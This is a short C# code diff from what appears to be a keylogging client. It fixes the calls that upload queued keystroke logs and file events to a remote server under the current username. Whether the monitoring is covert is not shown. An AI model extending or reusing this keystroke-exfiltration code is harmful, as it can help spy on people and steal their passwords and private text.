@@ -29,17 +29,13 @@ namespace Client.Communication
                     switch (i.Item2)
                     {
                         case StringType.Keylog:
-                            if (Server.AsyncSendString(sdata, Environment.UserName, "logs").Result)
-                            {
+                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "logs").Result)
                                 _sdata.Remove(i);
-                            }
                             else failed = true;
                             break;
                         case StringType.FileEvent:
-                            if (Server.AsyncSendString(sdata, Environment.UserName, "fileevent").Result)
-                            {
+                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "fileevent").Result)
                                 _sdata.Remove(i);
-                            }
                             else failed = true;
                             break;
                     }
